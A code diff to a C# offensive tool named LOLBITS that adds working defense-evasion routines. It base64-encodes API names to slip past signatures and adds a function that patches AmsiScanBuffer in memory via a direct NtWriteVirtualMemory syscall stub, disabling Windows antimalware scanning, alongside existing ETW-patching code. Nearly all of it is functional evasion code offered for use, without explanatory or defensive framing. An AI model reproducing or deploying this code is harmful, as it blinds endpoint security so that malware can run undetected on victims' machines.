@@ -226,7 +226,7 @@ namespace LOLBITS
 
         public static int getSystemPID(SysCallManager sysCall)
         {
-            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^5:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
+            string cmd = "FOR /F \"tokens=1,2,3,4,5\" %A in ('\"query process system | findstr svchost.exe | findstr/n ^^| findstr /b \"^15:\"\"') DO echo %E | findstr /b /r \"[0-9]\"";
             string pid = ExecuteCommand(cmd, sysCall);
             string[] spl = pid.Split('\n');
 
@@ -246,7 +246,7 @@ namespace LOLBITS
 
             IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA", 
                                                                                       typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
-            object[] procAddress = {libraryAddress, "EtwEventWrite" };
+            object[] procAddress = {libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("RXR3RXZlbnRXcml0ZQ=="))};
 
             var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress", 
                                                                             typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
@@ -276,6 +276,55 @@ namespace LOLBITS
 
             parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)hook.Length, oldProtect, x };
             response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx", 
+                                                                         typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+
+
+            return true;
+        }
+
+        public static bool handleAM(SysCallManager sysCall)
+        {
+
+            var hook = new byte[] { 0xB8,0x57,0x00,0x07,0x80,0xC3 };
+            uint oldProtect = 0, x = 0;
+            var shellCode = sysCall.GetSysCallAsm("NtWriteVirtualMemory");
+
+            DInvoke.PE.PE_MANUAL_MAP moduleDetails = sysCall.getMappedModule("C:\\Windows\\System32\\kernel32.dll");
+            object[] loadLibrary = { Encoding.UTF8.GetString(Convert.FromBase64String("YW1zaS5kbGw=")) };
+
+            IntPtr libraryAddress = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "LoadLibraryA",
+                                                                                      typeof(DInvoke.Win32.DELEGATES.LoadLibrary), loadLibrary);
+            object[] procAddress = { libraryAddress, Encoding.UTF8.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="))};
+
+            var address = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "GetProcAddress",
+                                                                            typeof(DInvoke.Win32.DELEGATES.GetProcAddress), procAddress);
+            if (address == IntPtr.Zero)
+                return false;
+
+            object[] parameters = { (IntPtr)(-1), address, (UIntPtr)hook.Length, (uint)0x40, oldProtect };
+
+            IntPtr hProcess = Process.GetCurrentProcess().Handle;
+
+            IntPtr response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
+                                                                                typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
+
+            oldProtect = (uint)parameters[4];
+
+            object[] virtualAlloc = { IntPtr.Zero, (UIntPtr)shellCode.Length, DInvoke.Win32.Kernel32.MemoryAllocationFlags.Commit | DInvoke.Win32.Kernel32.MemoryAllocationFlags.Reserve,
+                                      DInvoke.Win32.Kernel32.MemoryProtectionFlags.ExecuteReadWrite };
+            var shellCodeBuffer = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualAlloc",
+                                                                                    typeof(DInvoke.Win32.DELEGATES.VirtualAlloc), virtualAlloc);
+
+            Marshal.Copy(shellCode, 0, shellCodeBuffer, shellCode.Length);
+            var sysCallDelegate = Marshal.GetDelegateForFunctionPointer(shellCodeBuffer, typeof(NtWriteVirtualMemory));
+            var arguments = new object[] { hProcess, address, hook, (UIntPtr)(hook.Length), IntPtr.Zero };
+            var returnValue = sysCallDelegate.DynamicInvoke(arguments);
+            if ((int)returnValue != 0)
+                return false;
+
+            parameters = new object[] { (IntPtr)(-1), address, (UIntPtr)hook.Length, oldProtect, x };
+            response = (IntPtr)DInvoke.Generic.CallMappedDLLModuleExport(moduleDetails.PEINFO, moduleDetails.ModuleBase, "VirtualProtectEx",
                                                                          typeof(DInvoke.Win32.DELEGATES.VirtualProtectEx), parameters);
 
 
